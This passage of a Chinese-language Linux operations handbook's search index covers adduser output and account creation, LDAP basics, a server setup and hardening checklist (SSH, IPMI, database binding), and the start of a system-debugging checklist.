`test' ...\ninfo: Selecting UID/GID from range 1000 to 59999 ...\ninfo: Adding new group `test' (1145) ...\ninfo: Adding new user `test' (1145) with group `test (1145)' ...\ninfo: Creating home directory `/home/test' ...\ninfo: Copying files from `/etc/skel' ...\nNew password:\nRetype new password:\npasswd: password updated successfully\nChanging the user information for test\nEnter the new value, or press ENTER for the default\n        Full Name []: test\n        Room Number []:\n        Work Phone []:\n        Home Phone []:\n        Other []:\nIs the information correct? [Y/n]\ninfo: Adding new user `test' to supplemental / extra groups `users' ...\ninfo: Adding user `test' to group `users' ...\n</code></pre> <p>\u200b\u4ece\u200b\u8f93\u51fa\u200b\u4e2d\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0cadduser \u200b\u547d\u4ee4\u200b\u5b8c\u6210\u200b\u4e86\u200b\u4ee5\u4e0b\u200b\u51e0\u9879\u200b\u5de5\u4f5c\u200b\uff1a</p> <ul> <li> <p>\u200b\u521b\u5efa\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u65b0\u200b\u7684\u200b\u7528\u6237\u200b <code>test</code>\uff0c\u200b\u5e76\u200b\u4e3a\u200b\u5176\u200b\u5206\u914d\u200b\u4e86\u200b\u4e00\u4e2a\u200b UID \u200b\u548c\u200b GID\uff081145\uff09\u3002</p> <p>\u200b\u6ce8\u610f\u200b Unix \u200b\u7528\u6237\u200b\u548c\u200b\u7ec4\u662f\u200b\u901a\u8fc7\u200b\u6570\u5b57\u200b ID \u200b\u6765\u200b\u6807\u8bc6\u200b\u7684\u200b\uff0c\u200b\u56e0\u6b64\u200b\u201c\u200b\u521b\u5efa\u200b\u201d\u200b\u7528\u6237\u200b\u7684\u200b\u5168\u90e8\u5185\u5bb9\u200b\u5c31\u662f\u200b\u5728\u200b <code>/etc/passwd</code> \u200b\u6587\u4ef6\u200b\u4e2d\u200b\u6dfb\u52a0\u200b\u4e00\u884c\u200b\u4fe1\u606f\u200b\uff0c\u200b\u5c06\u200b\u7528\u6237\u540d\u200b\u548c\u200b UID \u200b\u5173\u8054\u200b\u8d77\u6765\u200b\uff0c\u200b\u5e76\u200b\u9644\u5e26\u200b\u5bb6\u200b\u76ee\u5f55\u200b\u548c\u200b\u767b\u5f55\u200b shell \u200b\u7b49\u200b\u989d\u5916\u200b\u4fe1\u606f\u200b\u3002 \u200b\u5373\u4f7f\u200b\u4e00\u4e2a\u200b\u201c\u200b\u7528\u6237\u200b\u201d\u200b\u4e0d\u200b\u5b58\u5728\u200b\u4e8e\u200b <code>/etc/passwd</code> \u200b\u6587\u4ef6\u200b\u4e2d\u200b\uff0c\u200b\u5bf9\u5e94\u200b\u7684\u200b UID \u200b\u4ecd\u7136\u200b\u662f\u200b\u6709\u6548\u200b\u7684\u200b\u3002</p> </li> <li> <p>\u200b\u521b\u5efa\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u65b0\u200b\u7684\u200b\u7ec4\u200b <code>test</code>\uff0c\u200b\u5e76\u200b\u4e3a\u200b\u5176\u200b\u5206\u914d\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u6570\u503c\u200b\u76f8\u540c\u200b\u7684\u200b GID\u3002</p> <p>\u200b\u8fd9\u4e2a\u200b\u9ed8\u8ba4\u200b\u884c\u4e3a\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u5728\u200b <code>adduser.conf</code> \u200b\u6587\u4ef6\u200b\u4e2d\u200b\u8bbe\u7f6e\u200b <code>USERGROUPS=no</code> \u200b\u6765\u200b\u7981\u7528\u200b\uff0c\u200b\u6b64\u540e\u200b\u6dfb\u52a0\u200b\u7684\u200b\u7528\u6237\u200b\u5c06\u200b\u4e0d\u518d\u200b\u521b\u5efa\u200b\u540c\u540d\u200b\u7684\u200b\u7ec4\u200b\uff0c\u200b\u800c\u662f\u200b\u9ed8\u8ba4\u200b\u5c5e\u4e8e\u200b <code>users</code> \u200b\u7ec4\u200b\u3002</p> </li> <li> <p>\u200b\u4e3a\u200b <code>test</code> \u200b\u7528\u6237\u200b\u521b\u5efa\u200b\u4e86\u200b\u5bb6\u200b\u76ee\u5f55\u200b <code>/home/test</code>\uff0c\u200b\u5e76\u200b\u4ece\u200b <code>/etc/skel</code> \u200b\u76ee\u5f55\u200b\u521d\u59cb\u5316\u200b\u8fd9\u4e2a\u200b\u65b0\u200b\u7684\u200b\u5bb6\u200b\u76ee\u5f55\u200b\u3002</p> <p><code>/etc/skel</code>\uff08\u200b\u540d\u79f0\u200b\u53d6\u81ea\u200b skeleton\uff09\u200b\u76ee\u5f55\u200b\u5305\u542b\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u9ed8\u8ba4\u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff0c\u200b\u4f8b\u5982\u200b <code>.bashrc</code> \u200b\u548c\u200b <code>.profile</code> \u200b\u7b49\u200b\u3002 \u200b\u7ba1\u7406\u5458\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u6309\u200b\u9700\u200b\u6dfb\u52a0\u200b\u5176\u4ed6\u200b\u6587\u4ef6\u200b\uff0c\u200b\u6ce8\u610f\u200b <code>/etc/skel</code> \u200b\u53ea\u4f1a\u200b\u5728\u200b\u521b\u5efa\u200b\u65b0\u200b\u7528\u6237\u200b\u65f6\u200b\u590d\u5236\u200b\u4e00\u6b21\u200b\uff0c\u200b\u4e0d\u4f1a\u200b\u5f71\u54cd\u200b\u73b0\u6709\u200b\u7528\u6237\u200b\u7684\u200b\u5bb6\u200b\u76ee\u5f55\u200b\u3002</p> </li> <li> <p>\u200b\u63d0\u793a\u200b\u7ba1\u7406\u5458\u200b\u8bbe\u7f6e\u200b\u7528\u6237\u200b\u7684\u200b\u5bc6\u7801\u200b\u548c\u200b\u5907\u6ce8\u200b\u4fe1\u606f\u200b\uff08gecos\uff09\u3002</p> </li> <li> <p>\u200b\u5c06\u200b <code>test</code> \u200b\u7528\u6237\u200b\u6dfb\u52a0\u200b\u5230\u200b <code>users</code> \u200b\u7ec4\u4e2d\u200b\u3002</p> <p>\u200b\u6ce8\u610f\u200b\u8fd9\u200b\u4e0d\u662f\u200b adduser \u200b\u7684\u200b\u9ed8\u8ba4\u200b\u884c\u4e3a\u200b\uff0c\u200b\u800c\u662f\u200b\u672c\u200b\u5b9e\u4f8b\u200b\u7684\u200b\u5b9e\u9a8c\u200b\u73af\u5883\u200b\u5728\u200b <code>adduser.conf</code> \u200b\u4e2d\u200b\u5df2\u7ecf\u200b\u8bbe\u7f6e\u200b\u4e86\u200b <code>ADD_EXTRA_GROUPS=1</code>\uff08\u200b\u6216\u8005\u200b\u6dfb\u52a0\u200b <code>--add-extra-groups</code> \u200b\u53c2\u6570\u200b\uff09\u3002</p> </li> </ul> <p><code>useradd</code> \u200b\u5462\u200b\uff1f</p> <p>\u200b\u5c3d\u7ba1\u200b\u5728\u200b\u5176\u4ed6\u200b\u7684\u200b\u53d1\u884c\u7248\u200b\u4e2d\u200b\u66f4\u52a0\u200b\u5e38\u89c1\u200b\uff0c\u200b\u4f46\u200b Debian \u200b\u8ba4\u4e3a\u200b <code>useradd(8)</code> \u200b\u662f\u200b\u4e00\u4e2a\u200b\u4f4e\u5c42\u6b21\u200b\u7684\u200b\u547d\u4ee4\u200b\uff0c\u200b\u56e0\u6b64\u200b\u4e0d\u200b\u5efa\u8bae\u200b\u7ba1\u7406\u5458\u200b\u76f4\u63a5\u200b\u4f7f\u7528\u200b\uff0c\u200b\u5e76\u4e14\u200b <code>adduser.conf</code> \u200b\u6587\u4ef6\u200b\u4e2d\u200b\u7684\u200b\u914d\u7f6e\u200b\u4e5f\u200b\u4e0d\u4f1a\u200b\u5bf9\u200b <code>useradd</code> \u200b\u547d\u4ee4\u200b\u751f\u6548\u200b\u3002</p> <p>\u200b\u7c7b\u4f3c\u200b\u5730\u200b\uff0cDebian \u200b\u4e5f\u200b\u4e0d\u200b\u63a8\u8350\u200b\u76f4\u63a5\u200b\u4f7f\u7528\u200b <code>userdel(8)</code> \u200b\u547d\u4ee4\u200b\u6765\u200b\u5220\u9664\u200b\u7528\u6237\u200b\uff0c\u200b\u5e76\u200b\u63d0\u4f9b\u200b\u4e86\u200b <code>deluser(8)</code> \u200b\u547d\u4ee4\u200b\u3002</p>"},{"location":"ops/accounts/#pam","title":"PAM","text":""},{"location":"ops/accounts/#ldap","title":"LDAP","text":"<p>LDAP \u200b\u5373\u200b\u8f7b\u91cf\u7ea7\u200b\u76ee\u5f55\u200b\u8bbf\u95ee\u200b\u534f\u8bae\u200b\uff08Lightweight Directory Access Protocol\uff09\uff0c\u200b\u662f\u200b\u4e00\u79cd\u200b\u7528\u4e8e\u200b\u8bbf\u95ee\u200b\u548c\u200b\u7ef4\u62a4\u200b\u5206\u5e03\u5f0f\u200b\u76ee\u5f55\u200b\u4fe1\u606f\u200b\u670d\u52a1\u200b\u7684\u200b\u5f00\u653e\u200b\u6807\u51c6\u534f\u8bae\u200b\u3002</p> <p>\u200b\u5728\u200b Linux \u200b\u4e2d\u200b\uff0cLDAP \u200b\u901a\u5e38\u200b\u7528\u4e8e\u200b\u96c6\u4e2d\u7ba1\u7406\u200b\u7528\u6237\u200b\u548c\u200b\u7ec4\u200b\u4fe1\u606f\u200b\uff0c\u200b\u5206\u4e3a\u200b\u670d\u52a1\u7aef\u200b\u548c\u200b\u5ba2\u6237\u7aef\u200b\u4e24\u200b\u90e8\u5206\u200b\u3002 \u200b\u670d\u52a1\u7aef\u200b\u8d1f\u8d23\u200b\u5b58\u50a8\u7528\u6237\u200b\u548c\u200b\u7ec4\u200b\u4fe1\u606f\u200b\uff0c\u200b\u5ba2\u6237\u7aef\u200b\u5219\u200b\u6309\u200b\u9700\u200b\u67e5\u8be2\u200b\u8fd9\u4e9b\u200b\u4fe1\u606f\u200b\uff0c\u200b\u5176\u4e2d\u200b\u7684\u200b\u6570\u636e\u4ea4\u6362\u200b\u683c\u5f0f\u200b\u4e3a\u200b LDIF\uff08LDAP Data Interchange Format\uff09\u3002</p> <p>\u200b\u5e38\u7528\u200b\u7684\u200b LDAP \u200b\u670d\u52a1\u5668\u200b\u6709\u200b OpenLDAP \u200b\u548c\u200b 389 Directory Server \u200b\u7b49\u200b\u3002 \u200b\u5728\u200b Debian \u200b\u4e2d\u200b\uff0cOpenLDAP \u200b\u7684\u200b\u8f6f\u4ef6\u200b\u540d\u4e3a\u200b <code>slapd</code>\uff0c\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b <code>apt install slapd</code> \u200b\u5b89\u88c5\u200b\u3002</p>"},{"location":"ops/checklist/","title":"\u8fd0\u7ef4\u200b\u68c0\u67e5\u5355","text":"<p>\u200b\u4e3b\u8981\u200b\u4f5c\u8005\u200b</p> <p>@iBug\u3001@libreliu</p> <p>\u200b\u672c\u6587\u200b\u7f16\u5199\u200b\u4e2d\u200b</p> <p>\u200b\u672c\u200b\u8282\u200b\u4e3b\u8981\u200b\u63d0\u4f9b\u200b\u5982\u5355\u200b/\u200b\u591a\u53f0\u200b Linux \u200b\u670d\u52a1\u5668\u200b\u4f9b\u200b\u591a\u7528\u6237\u200b\u5206\u4eab\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u7684\u200b\u8fd0\u7ef4\u200b\u914d\u7f6e\u200b\u548c\u200b\u68c0\u67e5\u200b\u6e05\u5355\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u9075\u5faa\u200b\u672c\u200b\u8282\u200b\u63d0\u4f9b\u200b\u7684\u200b\u5185\u5bb9\u200b\u8fdb\u884c\u200b\u8bbe\u7f6e\u200b\u548c\u200b\u6392\u67e5\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u5219\u200b\u53ef\u4ee5\u200b\u90e8\u7f72\u200b\u57fa\u672c\u200b\u53ef\u7528\u200b\u7684\u200b\u670d\u52a1\u5668\u200b\u73af\u5883\u200b\uff0c\u200b\u5e76\u4e14\u200b\u9632\u8303\u200b\u5e38\u89c1\u200b\u7684\u200b\u7f51\u7edc\u5b89\u5168\u200b\u95ee\u9898\u200b\u3002</p>"},{"location":"ops/checklist/#_2","title":"\u7cfb\u7edf\u200b\u5b89\u88c5","text":"<ul> <li>\u200b\u4f7f\u7528\u200b PXE \u200b\u65b9\u5f0f\u200b\u6216\u200b U \u200b\u76d8\u200b\u5b89\u88c5\u200b\u8f83\u200b\u7a33\u5b9a\u200b\u4e14\u200b\u786e\u4fdd\u200b\u9002\u5f53\u200b\u957f\u5ea6\u200b\u7684\u200b\u7ef4\u62a4\u200b\u65f6\u95f4\u200b\u7684\u200b Linux \u200b\u53d1\u884c\u7248\u200b</li> <li>\u200b\u5b89\u88c5\u200b\u65f6\u200b\u5bf9\u200b\u6709\u200b root \u200b\u6216\u200b\u6709\u200b sudo \u200b\u6743\u9650\u200b\u7684\u200b\u7528\u6237\u200b\u8bbe\u7f6e\u200b\u5f3a\u200b\u5bc6\u7801\u200b</li> <li>\u200b\u5c3d\u91cf\u200b\u5728\u200b SSD \u200b\u4e0a\u200b\u90e8\u7f72\u200b\u7cfb\u7edf\u200b rootfs\uff0c\u200b\u5e76\u4e14\u200b\u786e\u8ba4\u200b\u5206\u533a\u200b\u65b9\u6848\u200b\u5408\u7406\u200b</li> </ul>"},{"location":"ops/checklist/#_3","title":"\u8f6f\u4ef6\u200b\u5b89\u88c5","text":"<ul> <li>\u200b\u5bf9\u4e8e\u200b\u90e8\u7f72\u200b\u5728\u200b\u4e2d\u56fd\u200b\u5927\u9646\u200b\u5730\u533a\u200b\u7684\u200b\u670d\u52a1\u5668\u200b\uff0c\u200b\u4f7f\u7528\u200b\u955c\u50cf\u200b\u7ad9\u200b\u66ff\u6362\u200b\u8f6f\u4ef6\u5305\u200b\u7ba1\u7406\u7cfb\u7edf\u200b\u63d0\u4f9b\u200b\u7684\u200b\u6e90\u200b</li> <li>\u200b\u9664\u975e\u200b\u786e\u6709\u200b\u9700\u8981\u200b\uff0c\u200b\u4e0d\u200b\u4f7f\u7528\u200b\u9664\u200b\u8f6f\u4ef6\u5305\u200b\u7ba1\u7406\u7cfb\u7edf\u200b\u4e4b\u5916\u200b\u7684\u200b\u65b9\u6cd5\u200b\u5b89\u88c5\u200b\u8f6f\u4ef6\u200b\u5230\u200b <code>/home</code> \u200b\u5916\u200b\u7684\u200b\u4f4d\u7f6e\u200b\uff1b\u200b\u5bf9\u200b\u4f7f\u7528\u200b\u975e\u200b\u8f6f\u4ef6\u5305\u200b\u7ba1\u7406\u7cfb\u7edf\u200b\u4e4b\u5916\u200b\u7684\u200b\u65b9\u6cd5\u200b\u5b89\u88c5\u200b\u5230\u200b <code>/home</code> \u200b\u5916\u200b\u4f4d\u7f6e\u200b\u7684\u200b\u8f6f\u4ef6\u200b\uff0c\u200b\u7cfb\u7edf\u7ba1\u7406\u5458\u200b\u5e94\u200b\u5efa\u7acb\u200b\u53f0\u8d26\u200b</li> <li> <p>\u200b\u5bf9\u4e8e\u200b\u5b9e\u9a8c\u5ba4\u200b\u573a\u5408\u200b\uff0c\u200b\u5728\u200b\u7cfb\u7edf\u76ee\u5f55\u200b\u5185\u200b\u8bbe\u7f6e\u200b\u6070\u5f53\u200b\u7248\u672c\u200b\u7684\u200b\u7f16\u8bd1\u200b\u548c\u200b\u5f00\u53d1\u200b\u73af\u5883\u200b\uff0c\u200b\u5e76\u200b\u5bf9\u200b\u6709\u200b\u989d\u5916\u200b\u9700\u6c42\u200b\u7684\u200b\u7528\u6237\u200b\u7684\u200b\u63d0\u4f9b\u200b\u5728\u5bb6\u200b\u76ee\u5f55\u200b\u8bbe\u7f6e\u200b\u5355\u72ec\u200b\u5de5\u5177\u200b\u94fe\u200b\u7684\u200b\u9002\u5f53\u200b\u6307\u5f15\u200b</p> <p>TODO: explain</p> </li> <li> <p>\u200b\u5fc5\u8981\u200b\u4f46\u200b\u5bb9\u6613\u200b\u5ffd\u7565\u200b\u7684\u200b\u7ef4\u62a4\u200b\u7cfb\u7edf\u200b\u7a33\u5b9a\u200b\u3001\u200b\u5e2e\u52a9\u200b\u8c03\u8bd5\u200b\u7684\u200b\u5de5\u5177\u200b</p> <ul> <li><code>earlyoom</code> \u200b\u6216\u200b <code>systemd-oomd</code>\uff1a\u200b\u7528\u6237\u200b\u6001\u200b\u76d1\u6d4b\u200b\u5185\u5b58\u200b\u4f7f\u7528\u200b\uff0c\u200b\u5728\u200b\u5185\u5b58\u4e0d\u8db3\u200b\u65f6\u200b\u81ea\u52a8\u200b\u6740\u6b7b\u200b\u5360\u7528\u200b\u5185\u5b58\u200b\u8fc7\u591a\u200b\u7684\u200b\u8fdb\u7a0b\u200b</li> <li><code>systemd-coredump</code>\uff1a\u200b\u6536\u96c6\u200b\u5d29\u6e83\u200b\u8fdb\u7a0b\u200b\u7684\u200b coredump \u200b\u6587\u4ef6\u200b</li> <li><code>chrony</code> \u200b\u6216\u200b <code>systemd-timesyncd</code>\uff1a\u200b\u81ea\u52a8\u200b\u65f6\u949f\u200b\u540c\u6b65\u200b</li> <li><code>bcc-tools</code>\uff1a\u200b\u4e00\u7cfb\u5217\u200b\u57fa\u4e8e\u200b BPF \u200b\u7684\u200b\u8c03\u8bd5\u200b\u5de5\u5177\u200b</li> <li><code>bpftrace</code>\uff1a\u200b\u5feb\u901f\u200b\u7f16\u5199\u200b\u8ddf\u8e2a\u200b\u5185\u6838\u200b\u6216\u200b\u7528\u6237\u200b\u6001\u200b\u7a0b\u5e8f\u200b\u7684\u200b BPF \u200b\u7684\u200b\u811a\u672c\u200b</li> <li><code>rasdaemon</code>\uff1a\u200b\u6536\u96c6\u200b\u7cfb\u7edf\u200b\u786c\u4ef6\u200b\uff08CPU\u3001\u200b\u5185\u5b58\u200b\u7b49\u200b\uff09\u200b\u7684\u200b\u9519\u8bef\u4fe1\u606f\u200b</li> <li>\u200b\u6027\u80fd\u200b\u76d1\u6d4b\u200b\u5de5\u5177\u200b\uff0c\u200b\u5305\u62ec\u200b <code>htop</code>\u3001<code>iotop</code>\u3001<code>iftop</code>\u3001<code>bmon</code> \u200b\u7b49\u200b</li> <li><code>ncdu</code>\uff1a\u200b\u5feb\u901f\u200b\u68c0\u67e5\u200b\u8c01\u200b\u5403\u200b\u4e86\u200b\u5927\u91cf\u200b\u78c1\u76d8\u7a7a\u95f4\u200b</li> </ul> </li> </ul>"},{"location":"ops/checklist/#_4","title":"\u8fdc\u7a0b\u7ba1\u7406","text":"<ul> <li> <p>\u200b\u5bf9\u4e8e\u200b\u5e26\u6709\u200b IPMI \u200b\u7b49\u200b\u5e26\u5916\u200b\u7ba1\u7406\u200b\u529f\u80fd\u200b\u7684\u200b\u670d\u52a1\u5668\u200b\uff0c\u200b\u5c06\u200b\u5176\u200b\u542f\u7528\u200b\uff0c\u200b\u5e76\u200b\u914d\u7f6e\u200b\u56fa\u5b9a\u200b IP \u200b\u5730\u5740\u200b\u548c\u200b\u5b89\u5168\u200b\u7684\u200b\u5bc6\u7801\u200b\u540e\u200b\u63a5\u5165\u200b\u7f51\u7edc\u200b</p> <p>\u200b\u6b63\u786e\u200b\u914d\u7f6e\u200b\u7684\u200b IPMI \u200b\u529f\u80fd\u200b\u5c06\u200b\u4e3a\u200b\u670d\u52a1\u5668\u200b\u5d29\u6e83\u200b\u7b49\u200b\u65e0\u6cd5\u200b\u6b63\u5e38\u200b\u767b\u5f55\u200b\u8fdb\u5165\u200b\u670d\u52a1\u5668\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u7684\u200b\u91cd\u542f\u200b\u64cd\u4f5c\u200b\u63d0\u4f9b\u65b9\u4fbf\u200b\uff0c\u200b\u53ef\u200b\u63d0\u5347\u200b\u5982\u200b\u5047\u671f\u200b\u7b49\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u7684\u200b\u670d\u52a1\u5668\u200b\u53ef\u9760\u6027\u200b\u3002</p> </li> <li> <p>\u200b\u6b63\u786e\u200b\u8bbe\u7f6e\u200b SSH \u200b\u670d\u52a1\u200b\uff0c\u200b\u5e76\u200b\u4f5c\u4e3a\u200b\u8fdc\u7a0b\u7ba1\u7406\u200b\u7684\u200b\u4e3b\u8981\u200b\u624b\u6bb5\u200b</p> <p>TODO: add ref to ssh &amp; explain</p> </li> </ul>"},{"location":"ops/checklist/#_5","title":"\u7cfb\u7edf\u5b89\u5168","text":"<ul> <li>\u200b\u4e3a\u200b\u6240\u6709\u200b\u7528\u6237\u200b\uff08\u200b\u6216\u8005\u200b\u81f3\u5c11\u200b root \u200b\u53ca\u200b\u6709\u200b sudo \u200b\u6743\u9650\u200b\u7684\u200b\u7528\u6237\u200b\uff09\u200b\u90fd\u200b\u8bbe\u7f6e\u200b\u5f3a\u200b\u5bc6\u7801\u200b</li> <li>\u200b\u7981\u7528\u200b SSH \u200b\u7684\u200b\u5bc6\u7801\u200b\u767b\u5f55\u200b\uff08<code>PasswordAuthentication no</code>\uff09<ul> <li>\u200b\u5982\u679c\u200b\u6709\u200b\u4efb\u4f55\u200b\u539f\u56e0\u200b\u9700\u8981\u200b\u542f\u7528\u200b\u5bc6\u7801\u200b\u767b\u5f55\u200b\uff0c\u200b\u81f3\u5c11\u200b\u7981\u7528\u200b root \u200b\u7528\u6237\u200b\u7684\u200b\u5bc6\u7801\u200b\u767b\u5f55\u200b\uff08<code>PermitRootLogin prohibit-password</code>\uff09</li> <li>\u200b\u6216\u8005\u200b\uff0c\u200b\u4ec5\u200b\u5bf9\u200b\u6709\u200b\u9700\u8981\u200b\u7684\u200b\u7528\u6237\u200b\u542f\u7528\u200b\u5bc6\u7801\u200b\u767b\u5f55\u200b\uff08<code>Match user &lt;username&gt;</code>\u3001<code>PasswordAuthentication yes</code>\uff09</li> </ul> </li> </ul>"},{"location":"ops/checklist/#_6","title":"\u7f51\u7edc\u5b89\u5168","text":"<ul> <li>MySQL\u3001PostgreSQL\u3001Redis \u200b\u7b49\u200b\u6570\u636e\u5e93\u200b\u670d\u52a1\u200b\u53ea\u200b\u76d1\u542c\u200b\u672c\u5730\u200b\u5730\u5740\u200b\uff08localhost\u3001<code>127.0.0.1</code> \u200b\u6216\u200b Unix socket\uff09<ul> <li>\u200b\u6216\u8005\u200b\uff0c\u200b\u914d\u7f6e\u200b\u5916\u90e8\u200b\u9632\u706b\u5899\u200b\u963b\u65ad\u200b\u76f8\u5173\u200b\u7aef\u53e3\u200b\u7684\u200b\u5165\u200b\u7ad9\u200b\u8fde\u63a5\u200b\uff08\u200b\u4f8b\u5982\u200b MySQL: 3306\uff0cPostgreSQL: 5432\uff0cRedis: 6379\uff09</li> </ul> </li> </ul>"},{"location":"ops/debug/","title":"\u95ee\u9898\u200b\u8c03\u8bd5","text":"<p>\u200b\u4e3b\u8981\u200b\u4f5c\u8005\u200b</p> <p>@taoky</p> <p>\u200b\u672c\u6587\u200b\u5df2\u200b\u5b8c\u6210\u200b\uff0c\u200b\u7b49\u5f85\u200b\u6821\u5bf9\u200b</p> <p>\u200b\u672c\u200b\u90e8\u5206\u200b\u4ecb\u7ecd\u200b\u8c03\u8bd5\u200b\u95ee\u9898\u200b\u65f6\u200b\u7684\u200b\u4e00\u822c\u200b\u601d\u8def\u200b\u548c\u200b\u65b9\u6cd5\u200b\u3002 \u200b\u8bf7\u200b\u6ce8\u610f\u200b\u672c\u200b\u90e8\u5206\u200b\u65e0\u6cd5\u200b\u9762\u9762\u4ff1\u5230\u200b\uff0c\u200b\u56e0\u6b64\u200b\u53ea\u200b\u80fd\u591f\u200b\u63d0\u4f9b\u200b\u4e00\u4e9b\u200b\u5728\u200b\u8fd0\u7ef4\u4e0a\u200b\u5e38\u7528\u200b\u7684\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u5177\u4f53\u200b\u95ee\u9898\u200b\u9700\u8981\u200b\u5177\u4f53\u5206\u6790\u200b\u3002</p> <p>\u200b\u672c\u6587\u200b\u7684\u200b\u90e8\u5206\u200b\u5185\u5bb9\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u4e0e\u200b\u5176\u4ed6\u200b\u90e8\u5206\u200b\u7684\u200b\u5185\u5bb9\u200b\u5b58\u5728\u200b\u4e00\u5b9a\u200b\u91cd\u590d\u200b\u3002</p>"},{"location":"ops/debug/#quick-checklist","title":"\u5feb\u901f\u200b\u68c0\u67e5\u5355","text":"<p>\u200b\u4ee5\u4e0b\u200b\u63d0\u4f9b\u200b\u5728\u200b\u7cfb\u7edf\u200b\u9047\u5230\u200b\u5f02\u5e38\u60c5\u51b5\u200b\u65f6\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5feb\u901f\u200b\u68c0\u67e5\u200b\u7684\u200b\u4e00\u4e9b\u200b\u9879\u76ee\u200b\uff1a</p> <ul> <li>\u200b\u7cfb\u7edf\u200b\u8d1f\u8f7d\u200b<ul> <li><code>uptime</code> \u200b\u53ef\u4ee5\u200b\u67e5\u770b\u200b\u7cfb\u7edf\u200b\u5728\u200b\u8fc7\u53bb\u200b 1 \u200b\u5206\u949f\u200b\u30015 \u200b\u5206\u949f\u200b\u300115 \u200b\u5206\u949f\u200b\u7684\u200b\u5e73\u5747\u200b\u8d1f\u8f7d\u200b\u2014\u2014\u200b\u8fd9\u91cc\u200b\u7684\u200b\u300c\u200b\u8d1f\u8f7d\u200b\u300d\u200b\u6307\u200b\u7684\u200b\u662f\u200b\u6b63\u5728\u200b\u7b49\u5f85\u200b CPU \u200b\u7684\u200b\u8fdb\u7a0b\u200b\u6570\u91cf\u200b\uff08\u200b\u5305\u62ec\u200b\u9677\u5165\u200b\u4e0d\u53ef\u200b\u4e2d\u65ad\u200b\u7761\u7720\u200b\u7684\u200b\u8fdb\u7a0b\u200b\uff0c\u200b\u5927\u591a\u6570\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u5904\u4e8e\u200b\u8fd9\u79cd\u200b\u72b6\u6001\u200b\u7684\u200b\u8fdb\u7a0b\u200b\u90fd\u200b\u5728\u200b\u7b49\u5f85\u200b\u78c1\u76d8\u200b I/O\uff09\u3002</li> <li>PSI\uff08Pressure Stall Information\uff09\u200b\u4fe1\u606f\u200b\u53ef\u4ee5\u200b\u786e\u8ba4\u200b\u7cfb\u7edf\u200b\u7684\u200b\u5177\u4f53\u200b\u7684\u200b\u538b\u529b\u200b\u60c5\u51b5\u200b\u3002\u200b\u5728\u200b <code>/proc/pressure</code> \u200b\u76ee\u5f55\u200b\u4e0b\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b CPU\u3001I/O\u3001IRQ \u200b\u4ee5\u53ca\u200b\u5185\u5b58\u200b\u7684\u200b\u538b\u529b\u200b\u60c5\u51b5\u200b\u3002\u200b\u53ea\u8981\u200b\u6709\u200b\u4e00\u4e2a\u200b\u6216\u200b\u591a\u4e2a\u200b\u8fdb\u7a0b\u200b\u9700\u8981\u200b\u7f3a\u5c11\u200b\u67d0\u79cd\u200b\u8d44\u6e90\u200b\u800c\u200b\u7b49\u5f85\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5bf9\u5e94\u200b\u7684\u200b\u65f6\u95f4\u200b\u5c31\u200b\u4f1a\u200b\u88ab\u200b\u8ba1\u5165\u200b <code>some</code> \u200b\u884c\u4e2d\u200b\uff1b\u200b\u5982\u679c\u200b\u6240\u6709\u200b\u7684\u200b\u8fdb\u7a0b\u200b\u90fd\u200b\u56e0\u4e3a\u200b\u7f3a\u5c11\u200b\u67d0\u79cd\u200b\u8d44\u6e90\u200b\u800c\u200b\u7b49\u5f85\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5bf9\u5e94\u200b\u7684\u200b\u65f6\u95f4\u200b\u5c31\u200b\u4f1a\u200b\u88ab\u200b\u8ba1\u5165\u200b <code>full</code> \u200b\u884c\u4e2d\u200b\u3002<code>some</code> \u200b\u548c\u200b <code>full</code> \u200b\u4e2d\u200b\u7684\u200b <code>avg10</code>\u3001<code>avg60</code>\u3001<code>avg300</code> \u200b\u5206\u522b\u200b\u8868\u793a\u200b\u8fc7\u53bb\u200b 10 \u200b\u79d2\u200b\u300160 \u200b\u79d2\u200b\u3001300 \u200b\u79d2\u200b\u7684\u200b\u7b49\u5f85\u65f6\u95f4\u200b\u767e\u5206\u6bd4\u200b\uff080 \u200b\u5230\u200b 100\uff09\u3002<ul> <li>PSI \u200b\u53ef\u4ee5\u200b\u7cbe\u786e\u200b\u5230\u200b cgroup\u2014\u2014\u200b\u6bcf\u4e2a\u200b cgroup \u200b\u4e0b\u200b\u7684\u200b <code>*.pressure</code> \u200b\u5c31\u662f\u200b\u5bf9\u5e94\u200b\u7684\u200b\u538b\u529b\u200b\u4fe1\u606f\u200b\u3002</li> </ul> </li> <li><code>htop</code> \u200b\u53ef\u4ee5\u200b\u5feb\u901f\u200b\u67e5\u770b\u200b\u7cfb\u7edf\u200b\u7684\u200b CPU\u3001\u200b\u5185\u5b58\u200b\uff08\u200b\u5305\u62ec\u200b swap\uff09\u200b\u4ee5\u53ca\u200b\u8fdb\u7a0b\u200b\u60c5\u51b5\u200b\u3002\u200b\u5728\u200b\u8fdb\u7a0b\u200b\u6570\u91cf\u200b\u5f88\u591a\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c<code>top</code> \u200b\u7684\u200b\u6027\u80fd\u200b\u4f1a\u200b\u66f4\u597d\u200b\u4e00\u4e9b\u200b\uff08\u200b\u867d\u7136\u200b\u6613\u7528\u6027\u200b\u4e0d\u5982\u200b <code>htop</code>\uff09\u3002</li> <li><code>iostat 1</code> \u200b\u53ef\u4ee5\u200b\u6bcf\u9694\u200b 1 \u200b\u79d2\u200b\u8f93\u51fa\u200b\u4e00\u6b21\u200b\u78c1\u76d8\u200b I/O \u200b\u60c5\u51b5\u200b\u3002</li> </ul> </li> 